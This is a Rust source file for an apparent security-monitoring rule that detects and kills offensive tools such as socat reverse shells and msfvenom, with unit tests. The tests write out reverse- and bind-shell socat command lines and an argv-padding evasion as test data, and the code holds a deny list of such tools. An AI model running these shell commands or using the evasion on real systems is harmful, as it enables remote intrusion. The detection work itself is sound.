//! R006 — Known offensive security tooling.
//!
//! External audit PROC-010: the rule killed every exec named `socat`,
//! `/usr/bin/socat` from the distribution included — a relay that
//! virtualisation consoles, port-forwarding and test harnesses run — and an
//! operator had no allowlist to stop it. Now:
//!
//! - the process allowlist applies, judged on what the kernel executed;
//! - a `socat` the distribution installed — its executable in `/usr/bin`,
//!   `/bin`, `/usr/sbin` or `/sbin` — is recorded (Log, High), unless one
//!   of its addresses runs a shell (`EXEC:`, `SYSTEM:` or `SHELL:` with
//!   `sh`, `bash`…), the reverse- or bind-shell shape, which is still
//!   killed;
//! - a `socat` from anywhere else, and the other tools (no distribution
//!   ships them on a server), are still killed.
//!
//! Lab PR 166: a kill takes the tree. The shell that `socat EXEC:` runs is
//! its child, and a copied tool is the payload itself.
//!
//! External audit EBPF-021: the exec record keeps the first 511 bytes of
//! the command line, and filler options (`-d` repeated) pushed the shell
//! address past them: the distribution's socat then read as a plain relay.
//! When the kernel marks the argv as cut (or unread) and the part kept
//! runs no shell, the rule does not conclude that none does: the exec is
//! recorded at the severity of one that does (Log, Critical), the cut
//! named, instead of the relay's High record.
//!
//! Names are chosen by whoever runs the binary; a renamed tool evades this
//! rule, which the network and staging rules back up.

use std::sync::Arc;

use nn_model::{Event, ResponseAction, Severity, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::attack::{AttackRef, Tactic};
use crate::decision::{rules::build_verdict, Rule};
use crate::posture::host::PostureHost;

const OFFSEC_COMMS: &[&str] = &["socat", "msfvenom", "meterpreter", "sliver", "havoc"];

/// Where a distribution installs socat. Not the other system trees: a
/// webroot under `/usr/share` is R010's, and a build in `/usr/local` or
/// `/opt` is the operator's to allowlist.
const DISTRIBUTION_BIN_DIRS: &[&str] = &["/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/"];

/// Shells a socat address can run (`EXEC:/bin/sh`, `SYSTEM:bash -i`).
const SHELLS: &[&str] = &[
    "sh", "bash", "dash", "zsh", "ksh", "mksh", "ash", "busybox", "fish", "csh", "tcsh",
];

pub struct R006ReverseShellTooling<H: PostureHost> {
    allowlist: Arc<CommAllowlist<H>>,
}

impl<H: PostureHost> R006ReverseShellTooling<H> {
    pub fn new(allowlist: Arc<CommAllowlist<H>>) -> Self {
        Self { allowlist }
    }
}

/// A socat address in `argv` runs a shell: `EXEC:`, `SYSTEM:` or `SHELL:`
/// (any case) whose program — before socat's `,option` list and its own
/// arguments — is one of [`SHELLS`].
fn socat_runs_a_shell(argv: &[String]) -> bool {
    argv.iter().skip(1).any(|a| {
        let a = a.to_ascii_lowercase();
        let Some(cmd) = ["exec:", "system:", "shell:"]
            .iter()
            .find_map(|t| a.strip_prefix(t))
        else {
            return false;
        };
        let prog = cmd
            .trim_start_matches(['\'', '"', ' '])
            .split([',', ' ', '\'', '"'])
            .next()
            .unwrap_or("");
        SHELLS.contains(&prog.rsplit('/').next().unwrap_or(prog))
    })
}

impl<H: PostureHost> Rule for R006ReverseShellTooling<H> {
    fn id(&self) -> &'static str {
        "R006_ReverseShellTooling"
    }
    fn name(&self) -> &'static str {
        "Reverse shell tooling"
    }
    fn category(&self) -> &'static str {
        "lateral_movement"
    }
    fn attack(&self) -> &'static [AttackRef] {
        const ATTACK: &[AttackRef] = &[
            AttackRef::new(Tactic::CommandAndControl, "T1095"),
            AttackRef::new(Tactic::Execution, "T1059.004"),
        ];
        ATTACK
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            comm,
            filename,
            exe,
            argv,
            ..
        } = event
        else {
            return None;
        };
        if !OFFSEC_COMMS.iter().any(|c| comm == c) {
            return None;
        }
        let judgement = super::judge_spawn(&self.allowlist, event);
        if judgement == Judgement::Allowed {
            return None;
        }
        let image = exe.path_or(filename);
        let distribution = crate::posture::lineage::in_system_tree(image)
            && DISTRIBUTION_BIN_DIRS.iter().any(|d| image.starts_with(d));
        let cut = super::argv_cut_note(event);
        let verdict = if comm == "socat" && distribution && !socat_runs_a_shell(argv) {
            match cut {
                // External audit EBPF-021: no shell in the part kept is not
                // "no shell".
                Some(note) => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::Critical,
                    &format!(
                        "socat installed by the distribution ({image}) — not \
                         classified: {note}; an address past the cut may run a \
                         shell (EXEC:/SYSTEM:/SHELL:), so it is recorded at the \
                         severity of one that does, not as a relay"
                    ),
                ),
                None => build_verdict(
                    self,
                    event,
                    ResponseAction::Log,
                    Severity::High,
                    &format!(
                        "socat installed by the distribution ({image}) — recorded, not \
                         killed: the relay has legitimate uses; one running a shell \
                         (EXEC:/SYSTEM:/SHELL:) is killed"
                    ),
                ),
            }
        } else {
            build_verdict(
                self,
                event,
                ResponseAction::KillProcessTree,
                Severity::Critical,
                &super::with_argv_cut_note(
                    "Known offensive security tooling detected".to_string(),
                    event,
                ),
            )
        };
        Some(judgement.apply(verdict, comm))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // R08b (lab PR 251): on the portable test host.
    use crate::posture::host::testing::TestHost as H;
    type CommAllowlist = crate::config::comm_allowlist::CommAllowlist<H>;
    type R006ReverseShellTooling = super::R006ReverseShellTooling<H>;
    use crate::decision::rules::testutil::{argv_cut, spawn, spawn_exe, spawn_full};

    fn rule() -> R006ReverseShellTooling {
        R006ReverseShellTooling::new(Arc::new(CommAllowlist::default()))
    }

    #[test]
    fn fires_on_each_offsec_tool() {
        for comm in OFFSEC_COMMS {
            let v = rule()
                .evaluate(&spawn(comm, "/home/alice/whatever"))
                .unwrap_or_else(|| panic!("should fire on {comm}"));
            assert_eq!(v.action, ResponseAction::KillProcessTree);
            assert_eq!(v.severity, Severity::Critical);
        }
    }

    /// Lab PR 166: the shell a system socat runs, and a copied tool's
    /// children, die with it.
    #[test]
    fn r006_kills_the_process_tree() {
        let shell = spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:127.0.0.1:9", "EXEC:/bin/sh"],
            "bash",
        );
        for e in [shell, spawn_exe("socat", "socat", "/tmp/socat", 0)] {
            let v = rule().evaluate(&e).expect("fires");
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{e:?}");
        }
    }

    #[test]
    fn ignores_benign_tools() {
        assert!(rule().evaluate(&spawn("ssh", "/usr/bin/ssh")).is_none());
    }

    #[test]
    fn match_is_exact_not_prefix() {
        assert!(rule()
            .evaluate(&spawn("socat-helper", "/usr/bin/socat-helper"))
            .is_none());
    }

    /// External audit PROC-010: the distribution's socat is recorded; a
    /// copy anywhere else, and the other tools from anywhere, are killed.
    #[test]
    fn r006_system_socat_is_recorded_a_copy_is_killed() {
        let v = rule()
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .unwrap();
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::High);
        for (comm, path) in [
            ("socat", "/home/alice/socat"),
            ("socat", "/usr/bin/../../tmp/socat"),
            ("socat", "/usr/share/nginx/html/socat"),
            ("socat", "/opt/tools/socat"),
            ("msfvenom", "/usr/bin/msfvenom"),
        ] {
            let v = rule().evaluate(&spawn_exe(comm, comm, path, 0)).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{path}");
            assert_eq!(v.severity, Severity::Critical, "{path}");
        }
    }

    /// External audit PROC-010: a system socat that runs a shell is the
    /// reverse- or bind-shell shape, and is killed.
    #[test]
    fn r006_system_socat_running_a_shell_is_killed() {
        for args in [
            &[
                "socat",
                "TCP:10.0.0.9:4444",
                "EXEC:/bin/sh,pty,stderr,setsid",
            ][..],
            &["socat", "tcp-listen:9001,fork", "exec:bash -li"][..],
            &["socat", "-d", "TCP:h:1", "SYSTEM:'sh -i'"][..],
            &["socat", "TCP:h:1", "SHELL:zsh"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::KillProcessTree, "{args:?}");
        }
        for args in [
            &[
                "socat",
                "UNIX-CONNECT:/run/qemu/serial0",
                "STDIO,raw,echo=0",
            ][..],
            &["socat", "TCP-LISTEN:8080,fork", "TCP:127.0.0.1:80"][..],
            &["socat", "TCP:h:1", "EXEC:/usr/bin/id"][..],
        ] {
            let e = spawn_full("socat", "/usr/bin/socat", 1000, args, "bash");
            let v = rule().evaluate(&e).unwrap();
            assert_eq!(v.action, ResponseAction::Log, "{args:?}");
        }
    }

    /// External audit EBPF-021: filler options push the shell address past
    /// the 511 bytes the kernel keeps. A cut argv whose kept part runs no
    /// shell is not a relay: recorded at Critical, the cut named. A whole
    /// argv keeps the relay's High record; a shell in the kept part is
    /// still killed; a copy is still killed, the cut named.
    #[test]
    fn r006_socat_with_truncated_argv_is_logged() {
        let mut args = vec!["socat"];
        args.extend(std::iter::repeat_n("-d", 200));
        args.push("TCP:127.0.0.1:9");
        let padded = argv_cut(spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash"));
        let v = rule().evaluate(&padded).expect("fires");
        assert_eq!(v.action, ResponseAction::Log);
        assert_eq!(v.severity, Severity::Critical);
        assert!(
            v.reasoning.contains("argv truncated at 511 bytes"),
            "{}",
            v.reasoning
        );
        assert!(v.reasoning.contains("not classified"), "{}", v.reasoning);

        // Unread argv: the same, named as unread.
        let unread = argv_cut(spawn_exe("socat", "/usr/bin/socat", "/usr/bin/socat", 0));
        let v = rule().evaluate(&unread).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::Critical)
        );
        assert!(v.reasoning.contains("argv not read"), "{}", v.reasoning);

        // The same argv, whole: the relay's record.
        let whole = spawn_full("socat", "/usr/bin/socat", 1000, &args, "bash");
        let v = rule().evaluate(&whole).unwrap();
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::High)
        );

        // A shell in the part kept: killed, cut or not.
        let shell = argv_cut(spawn_full(
            "socat",
            "/usr/bin/socat",
            1000,
            &["socat", "TCP:h:1", "EXEC:/bin/sh"],
            "bash",
        ));
        let v = rule().evaluate(&shell).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("argv truncated"), "{}", v.reasoning);

        // A copy: killed as before, the cut named.
        let copy = argv_cut(spawn_exe("socat", "socat", "/tmp/socat", 0));
        let v = rule().evaluate(&copy).unwrap();
        assert_eq!(v.action, ResponseAction::KillProcessTree);
    }

    /// External audit PROC-010: an operator allowlist, judged on what the
    /// kernel executed: the installed socat is exempt, a copy is not.
    #[test]
    fn r006_allowlisted_by_identity_is_exempt() {
        let r = R006ReverseShellTooling::new(Arc::new(CommAllowlist::from_iter_owned([
            "socat".to_string()
        ])));
        assert!(r
            .evaluate(&spawn_exe("socat", "socat", "/usr/bin/socat", 0))
            .is_none());
        let v = r
            .evaluate(&spawn_exe("socat", "./socat", "/home/alice/socat", 0))
            .expect("a copy is not the allowlisted socat");
        assert_eq!(v.action, ResponseAction::KillProcessTree);
        assert!(v.reasoning.contains("named 'socat'"), "{}", v.reasoning);
    }
}
